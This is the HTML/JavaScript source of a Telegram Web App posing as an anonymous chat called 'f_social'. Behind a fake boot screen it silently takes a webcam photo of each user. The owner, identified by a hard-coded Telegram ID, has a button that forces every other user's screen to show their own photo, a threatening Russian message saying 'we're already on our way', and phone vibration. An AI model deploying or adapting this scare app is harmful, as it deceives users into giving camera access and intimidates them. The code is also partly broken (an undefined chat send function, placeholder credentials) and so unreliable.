<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>f_social // root_access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; --f-green: #00ff41; }
        body { background: var(--f-black); color: var(--f-white); font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        /* ТЕРМИНАЛ */
        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: var(--f-green); }
        
        #app { display: none; flex-direction: column; height: 100vh; }
        header { padding: 10px; border-bottom: 1px solid #222; text-align: center; position: relative; }
        
        /* КНОПКА АДМИНА */
        #admin-btn { display: none; position: absolute; right: 10px; top: 10px; background: var(--f-red); color: white; border: none; padding: 5px 10px; font-size: 10px; font-weight: bold; cursor: pointer; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }

        .nav-tabs { display: flex; border-bottom: 1px solid #222; background: #0d0d0d; }
        .tab { flex: 1; padding: 12px 5px; text-align: center; font-size: 9px; cursor: pointer; color: #444; text-transform: uppercase; }
        .tab.active { color: var(--f-red); border-bottom: 2px solid var(--f-red); }

        .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; }
        .tab-content.active { display: flex; flex-direction: column; }

        #captured-photo { width: 100%; max-width: 300px; border: 2px solid var(--f-red); margin: 15px auto; display: block; }
        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; }
        
        #global-chat { flex-grow: 1; overflow-y: auto; font-size: 13px; margin-bottom: 10px; }
        .m-user { color: var(--f-red); font-size: 10px; }
    </style>
</head>
<body>

    <div id="boot-screen"><div id="boot-logs"></div></div>

    <div id="app">
        <header>
            <div id="user-id" style="font-size: 10px; color: #555;">USER: anon_wait...</div>
            <div class="logo">f_<span>social</span></div>
            <button id="admin-btn" onclick="triggerHack()">[EXECUTE_PAYLOAD]</button>
        </header>

        <nav class="nav-tabs">
            <div class="tab active" onclick="openTab(event, 'tab-chat')">/chat</div>
            <div class="tab" onclick="openTab(event, 'tab-whoami')">/whoami</div>
        </nav>

        <div id="tab-chat" class="tab-content active">
            <div id="global-chat"></div>
            <div style="display:flex; gap:5px;">
                <input type="text" id="chat-in" style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:10px;">
                <button onclick="sendMsg()" style="background:var(--f-red); border:none; color:#fff; padding:10px;">></button>
            </div>
        </div>

        <div id="tab-whoami" class="tab-content">
            <img id="captured-photo" src="">
            <div id="alert-text">МЫ УЖЕ ВЫЕХАЛИ. КУ ОТ F SOCIAL.</div>
        </div>
    </div>

<script>
    // 1. КОНФИГ FIREBASE
    const firebaseConfig = {
        apiKey: "ТВОЙ_КЛЮЧ",
        databaseURL: "ТВОЯ_ССЫЛКА",
        projectId: "ТВОЙ_ID"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // 2. ТВОЙ ID (Замени на свой реальный ID из Telegram)
    const MY_TG_ID = 5131628747; 
    
    let isElliot = false;
    let myNick = "anon_" + Math.floor(Math.random()*999);

    window.onload = () => {
        const tg = window.Telegram.WebApp;
        tg.ready();
        
        // Проверка: это ты или нет?
        if (tg.initDataUnsafe?.user?.id === MY_TG_ID) {
            isElliot = true;
            myNick = "Elliot_Alderson";
            document.getElementById('admin-btn').style.display = 'block';
        }
        
        document.getElementById('user-id').innerText = `USER: ${myNick}`;
        bootSequence();
        listenForHack(); // Слушаем сигнал атаки
    };

    async function bootSequence() {
        const logs = ["init_core...", "auth_check...", "loading_ui..."];
        for(let t of logs) {
            let l = document.createElement('div'); l.innerText = `> ${t}`;
            document.getElementById('boot-logs').appendChild(l);
            await new Promise(r => setTimeout(r, 400));
        }
        startCapture();
    }

    async function startCapture() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => {
                    document.getElementById('captured-photo').src = URL.createObjectURL(b);
                    s.getTracks().forEach(t => t.stop());
                    document.getElementById('boot-screen').style.display = 'none';
                    document.getElementById('app').style.display = 'flex';
                }, 'image/jpeg');
            }, 2000);
        } catch(e) {
            document.getElementById('boot-screen').style.display = 'none';
            document.getElementById('app').style.display = 'flex';
        }
    }

    // ЛОГИКА АТАКИ
    function triggerHack() {
        if(!isElliot) return;
        // Отправляем сигнал "1" в базу
        db.ref('attack_signal').set(Math.random()); 
        alert("Payload sent to all nodes.");
    }

    function listenForHack() {
        db.ref('attack_signal').on('value', () => {
            if (isElliot) return; // Тебя самого не "взламывает"
            
            // ПРИНУДИТЕЛЬНОЕ ПЕРЕКЛЮЧЕНИЕ У ЖЕРТВЫ
            openTab(null, 'tab-whoami');
            document.getElementById('alert-text').style.display = 'block';
            
            // Можно добавить вибрацию на телефоне
            if(window.navigator.vibrate) window.navigator.vibrate([500, 200, 500]);
        });
    }

    function openTab(evt, tabId) {
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
        if(evt) evt.currentTarget.classList.add('active');
        else document.querySelector(`[onclick*="${tabId}"]`).classList.add('active');
    }
</script>
</body>
</html>
